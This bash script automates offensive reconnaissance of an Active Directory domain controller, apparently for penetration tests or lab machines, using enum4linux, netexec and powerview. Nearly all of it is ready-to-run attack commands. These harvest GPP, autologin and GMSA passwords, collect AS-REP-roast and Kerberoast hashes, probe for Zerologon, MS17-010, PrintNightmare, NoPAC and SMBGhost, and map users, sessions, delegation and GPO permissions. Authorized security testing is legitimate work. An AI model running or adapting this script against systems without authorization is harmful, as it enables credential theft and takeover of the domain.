#!/bin/bash

# Optimized Active Directory Enumeration Script with Colored Output and Manual Exit
# Usage: unbuffer ./EnumAD_Colored_NoTee.sh -i <IP> [-u <username>] [-p <password>] [-d <domain>] [-h]
# Example: unbuffer ./EnumAD_Colored_NoTee.sh -i 10.129.42.188 -u user -p pass -d domain.com | tee output_10.129.42.188.log
# View log: less -r output_10.129.42.188.log

# Color definitions
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m' # No Color

# Default values
IP=""
USERNAME=""
PASSWORD=""
DOMAIN=""

source /root/venv/bin/activate
# Function to handle cleanup on exit
cleanup() {
    echo -e "${RED}\n[*] Script interrupted by user (Ctrl+C). Cleaning up...${NC}"
    # Remove temporary files generated by netexec
    rm -f __netexec_asreproast.txt __netexec_kerberoasting.txt 2>/dev/null
    echo -e "${RED}[*] Exiting at $(date)${NC}"
    exit 1
}

# Trap SIGINT (Ctrl+C) to call cleanup
trap cleanup SIGINT

# Function to display help
usage() {
    echo -e "${BLUE}Usage: $(basename $0) -i <IP> [-u <username>] [-p <password>] [-d <domain>] [-h]${NC}"
    echo -e "${BLUE}Options:${NC}"
    echo -e "  -i  Target IP address (required)"
    echo -e "  -u  Username for authentication (optional)"
    echo -e "  -p  Password for authentication (optional)"
    echo -e "  -d  Domain name (optional)"
    echo -e "  -h  Display this help message"
    echo -e "${BLUE}\nLogging:${NC}"
    echo -e "  [*] Suggested command: unbuffer $(basename $0) [options] | tee output_<IP>.log"
    echo -e "  [*] View log with: less -r output_<IP>.log"
    exit 1
}

# Parse command-line arguments
while getopts "i:u:p:d:h" opt; do
    case $opt in
        i) IP="$OPTARG" ;;
        u) USERNAME="$OPTARG" ;;
        p) PASSWORD="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Validate IP
if [[ -z "$IP" ]]; then
    echo -e "${RED}Error: IP address is required.${NC}"
    usage
fi

# Validate tools
check_tool() {
    if ! command -v "$1" &> /dev/null; then
        echo -e "${RED}Error: $1 is not installed. Please install it.${NC}"
        exit 1
    fi
}
check_tool enum4linux
check_tool netexec
check_tool powerview

# Prepare domain parameter for netexec
DOMAIN_PARAM=""
if [[ -n "$DOMAIN" ]]; then
    DOMAIN_PARAM="-d $DOMAIN"
fi

# Function to display messages with color
log_color() {
    local level=$1
    local message=$2
    local color
    case $level in
        INFO) color=$GREEN ;;
        WARN) color=$YELLOW ;;
        ERROR) color=$RED ;;
        HEADER) color=$BLUE ;;
        *) color=$NC ;;
    esac
    echo -e "${color}${message}${NC}"
}

# Start logging
log_color INFO "[*] Starting AD enumeration on $IP at $(date)"

# enum4linux
enum4linux_scan() {
    log_color HEADER "\n=== enum4linux ==="
    timeout 120 enum4linux -a -A -u "$USERNAME" -p "$PASSWORD" "$IP"
}

# netexec null session
netexec_null_session() {
    log_color HEADER "\n=== NETEXEC: Null Session ==="
    log_color INFO "\n[*] Enumerating SMB shares (null session)..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u '' -p '' --shares
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u 'guest' -p '' --shares
}

# netexec authenticated scans
netexec_authenticated() {
    log_color HEADER "\n=== NETEXEC: Authenticated Scans ==="
    log_color INFO "\n[*] Checking user permissions (SMB/WMI/WinRM/RDP/MSSQL)..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD"
    timeout 100 netexec wmi "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD"
    timeout 100 netexec winrm "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD"
    timeout 100 netexec rdp "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD"
    timeout 100 netexec mssql "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M mssql_priv

    log_color INFO "\n[*] Checking local authentication permissions..."
    timeout 100 netexec rdp "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --local-auth
    timeout 100 netexec winrm "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --local-auth
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --local-auth
    timeout 100 netexec mssql "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --local-auth -M mssql_priv

    log_color INFO "\n[*] Enumerating user groups..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M groupmembership -o USER="$USERNAME"

    log_color INFO "\n[*] Enumerating SMB shares..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --shares

    log_color INFO "\n[*] Enumerating autologin credentials..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M gpp_autologin
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M reg-winlogon

    log_color INFO "\n[*] Enumerating GPP passwords..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M gpp_password

    log_color INFO "\n[*] Enumerating GMSA passwords..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --gmsa

    log_color INFO "\n[*] Enumerating ASREPRoast..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --asreproast __netexec_asreproast.txt

    log_color INFO "\n[*] Enumerating Kerberoasting..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --kerberoasting __netexec_kerberoasting.txt

    log_color INFO "\n[*] Checking LDAP configuration..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M ldap-checker

    log_color INFO "\n[*] Testing WebDAV attack..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M webdav

    log_color INFO "\n[*] Testing PrintNightmare attack..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M printnightmare
}

# netexec attacks
netexec_attacks() {
    log_color HEADER "\n=== NETEXEC: Attacks ==="
    log_color INFO "\n[*] Testing CVE-2019-1040 (remove-mic)..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M remove-mic

    log_color INFO "\n[*] Testing NoPAC..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M nopac

    log_color INFO "\n[*] Testing Spooler..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M spooler

    log_color INFO "\n[*] Testing Coerce Plus..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M coerce_plus

    log_color INFO "\n[*] Testing Zerologon (may take 1 minute)..."
    timeout 180 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M zerologon --timeout=60

    log_color INFO "\n[*] Testing MS17-010..."
    timeout 180 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M ms17-010 --timeout=60

    log_color INFO "\n[*] Testing SMBGhost..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M smbghost

    log_color INFO "\n[*] Testing IOXIDResolver..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M ioxidresolver
}

# netexec general enumeration
netexec_general() {
    log_color HEADER "\n=== NETEXEC: General Enumeration ==="
    log_color INFO "\n[*] Enumerating antivirus via SMB..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M enum_av
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M wcc

    log_color INFO "\n[*] Enumerating ADCS..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M adcs
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M enum_ca

    log_color INFO "\n[*] Enumerating logged-on users..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --loggedon-users

    log_color INFO "\n[*] Enumerating domain SID..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --get-sid

    log_color INFO "\n[*] Enumerating sessions..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --sessions

    log_color INFO "\n[*] Enumerating computers via SMB..."
    timeout 100 netexec smb "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --computers

    log_color INFO "\n[*] Enumerating trusts..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" -M enum_trusts

    log_color INFO "\n[*] Enumerating accounts with password not required..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --password-not-required

    log_color INFO "\n[*] Enumerating trusted for delegation..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --trusted-for-delegation

    log_color INFO "\n[*] Enumerating active users via LDAP..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --query "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" "sAMAccountName description"

    log_color INFO "\n[*] Enumerating disabled users via LDAP..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --query "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" "sAMAccountName description"

    log_color INFO "\n[*] Enumerating all users via LDAP..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --query "(objectClass=user)" "sAMAccountName description"

    log_color INFO "\n[*] Enumerating all groups via LDAP..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --query "(objectClass=group)" "sAMAccountName description"

    log_color INFO "\n[*] Enumerating all computers via LDAP..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --query "(objectCategory=computer)" "sAMAccountName description"

    log_color INFO "\n[*] Enumerating all SPNs via LDAP..."
    timeout 100 netexec ldap "$IP" $DOMAIN_PARAM -u "$USERNAME" -p "$PASSWORD" --query "(servicePrincipalName=*)" "sAMAccountName servicePrincipalName"
}

# powerview scans
powerview_scans() {
    log_color HEADER "\n=== powerview ==="
    log_color INFO "\n[*] Enumerating logon scripts..."
    timeout 100 powerview "$USERNAME":"$PASSWORD"@"$IP" -q 'Get-DomainObject -Where "scriptPath not null" -Select sAMAccountName,lastLogon,lastLogonTimestamp,logonCount,scriptPath -TableView'

    log_color INFO "\n[*] Enumerating GPOs..."
    timeout 100 powerview "$USERNAME":"$PASSWORD"@"$IP" -q 'Get-DomainGPO -Properties cn,displayName,whenChanged,whenCreated,versionNumber,gPCFileSysPath,gPCMachineExtensionNames,gPCUserExtensionNames'

    log_color INFO "\n[*] Enumerating users with SPN write permissions..."
    timeout 100 powerview "$USERNAME":"$PASSWORD"@"$IP" -q 'Get-DomainObjectAcl -ResolveGUIDs -Where "ObjectAceType match Service-Principal-Name" -Select ObjectDN,AccessMask,SecurityIdentifier -TableView'

    log_color INFO "\n[*] Enumerating GPO creation permissions..."
    timeout 100 powerview "$USERNAME":"$PASSWORD"@"$IP" -q 'Get-DomainObjectAcl -Identity "Policies" -Where "AccessMask contain CreateChild" -Select SecurityIdentifier'

    log_color INFO "\n[*] Enumerating GPO modification permissions..."
    command_output=$(timeout 100 powerview "$USERNAME":"$PASSWORD"@"$IP" -q 'Get-DomainGPO -Properties cn' --no-admin-check --no-cache | grep '^{')
    echo "$command_output" | while IFS= read -r line; do
        log_color INFO "[GPO]: $line"
        timeout 100 powerview "$USERNAME":"$PASSWORD"@"$IP" -q "Get-DomainObjectAcl -Identity $line -Select ActiveDirectoryRights,SecurityIdentifier -ResolveGUIDs -TableView"
    done

    log_color INFO "\n[*] Enumerating GPO link permissions..."
    timeout 100 powerview "$USERNAME":"$PASSWORD"@"$IP" -q "Get-DomainObjectAcl -ResolveGUIDs -Where 'ObjectAceType match GP-Link' -NoCache -Select ObjectDN,AccessMask,SecurityIdentifier -TableView"
}

# Execute scans
enum4linux_scan
netexec_null_session
if [[ -n "$PASSWORD" ]]; then
    netexec_authenticated
    powerview_scans
fi
netexec_attacks
netexec_general

log_color INFO "\n[*] Enumeration completed. Please check output_$IP.log with: less -r output_$IP.log"
log_color WARN "[Note] Additional tools recommended: powerview Find-LocalAdminAccess (add DNS to /etc/resolv.conf)"